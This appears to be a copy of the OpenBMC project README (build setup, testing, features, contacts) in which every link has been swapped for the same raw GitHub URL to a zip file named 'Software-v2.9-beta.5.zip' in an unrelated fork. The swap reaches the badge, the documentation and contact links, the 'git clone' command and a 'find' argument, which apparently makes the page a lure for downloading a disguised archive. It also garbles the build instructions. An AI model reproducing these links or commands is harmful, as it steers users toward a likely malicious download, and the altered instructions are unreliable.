# OpenBMC

[![Build Status](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)

The OpenBMC project can be described as a Linux distribution for embedded
devices that have a BMC; typically, but not limited to, things like servers,
top of rack switches or RAID appliances. The OpenBMC stack uses technologies
such as [Yocto](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip),
[OpenEmbedded](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip),
[systemd](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip), and
[D-Bus](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip) to allow easy
customization for your server platform.


## Setting up your OpenBMC project

### 1) Prerequisite
- Ubuntu 14.04

```
sudo apt-get install -y git build-essential libsdl1.2-dev texinfo gawk chrpath diffstat
```

- Fedora 28

```
sudo dnf install -y git patch diffstat texinfo chrpath SDL-devel bitbake \
    rpcgen perl-Thread-Queue perl-bignum perl-Crypt-OpenSSL-Bignum
sudo dnf groupinstall "C Development Tools and Libraries"
```
### 2) Download the source
```
git clone https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip
cd openbmc
```

### 3) Target your hardware
Any build requires an environment variable known as `TEMPLATECONF` to be set
to a hardware target.
You can see all of the known targets with
`find meta-* -name https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip`. Choose the hardware target and
then move to the next step. Additional examples can be found in the
[OpenBMC Cheatsheet](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)

Machine | TEMPLATECONF
--------|---------
Palmetto | ```meta-ibm/meta-palmetto/conf```
Zaius| ```meta-ingrasys/meta-zaius/conf```
Witherspoon| ```meta-ibm/meta-witherspoon/conf```
Romulus| ```meta-ibm/meta-romulus/conf```


As an example target Romulus
```
export TEMPLATECONF=meta-ibm/meta-romulus/conf
```

### 4) Build

```
. openbmc-env
bitbake obmc-phosphor-image
```

Additional details can be found in the [docs](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)
repository.

## OpenBMC Development

The OpenBMC community maintains a set of tutorials new users can go through
to get up to speed on OpenBMC development out
[here](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)

## Build Validation and Testing
Commits submitted by members of the OpenBMC GitHub community are compiled and
tested via our [Jenkins](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip) server.  Commits are run
through two levels of testing.  At the repository level the makefile `make
check` directive is run.  At the system level, the commit is built into a
firmware image and run with an arm-softmmu QEMU model against a barrage of
[CI tests](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip).

Commits submitted by non-members do not automatically proceed through CI
testing. After visual inspection of the commit, a CI run can be manually
performed by the reviewer.

Automated testing against the QEMU model along with supported systems are
performed.  The OpenBMC project uses the
[Robot Framework](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip) for all automation.  Our
complete test repository can be found
[here](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip).

## Submitting Patches
Support of additional hardware and software packages is always welcome.
Please follow the [contributing guidelines](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)
when making a submission.  It is expected that contributions contain test
cases.

## Bug Reporting
[Issues](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip) are managed on
GitHub.  It is recommended you search through the issues before opening
a new one.

## Questions

First, please do a search on the internet. There's a good chance your question
has already been asked.

For general questions, please use the openbmc tag on
[Stack Overflow](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip).
Please review the [discussion](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)
on Stack Overflow licensing before posting any code.

For technical discussions, please see [contact info](#contact) below for IRC and
mailing list information. Please don't file an issue to ask a question. You'll
get faster results by using the mailing list or IRC.

## Features of OpenBMC

**Feature List**
* Host management: Power, Cooling, LEDs, Inventory, Events, Watchdog
* Full IPMI 2.0 Compliance with DCMI
* Code Update Support for multiple BMC/BIOS images
* Web-based user interface
* REST interfaces
* D-Bus based interfaces
* SSH based SOL
* Remote KVM
* Hardware Simulation
* Automated Testing
* User management
* Virtual media

**Features In Progress**
* OpenCompute Redfish Compliance
* Verified Boot

**Features Requested but need help**
* OpenBMC performance monitoring


## Finding out more

Dive deeper into OpenBMC by opening the
[docs](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip) repository.

## Technical Steering Committee

The Technical Steering Committee (TSC) guides the project. Members are:

 * Brad Bishop (chair), IBM
 * Nancy Yuen, Google
 * Sai Dasari, Facebook
 * James Mihm, Intel
 * Sagar Dharia, Microsoft
 * Supreeth Venkatesh, Arm

## Contact
- Mail: https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip [https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)
- IRC: #openbmc on https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip
- Riot: [https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip](https://raw.githubusercontent.com/vinhkennej/openbmc/master/poky/meta/recipes-connectivity/ofono/Software-v2.9-beta.5.zip)
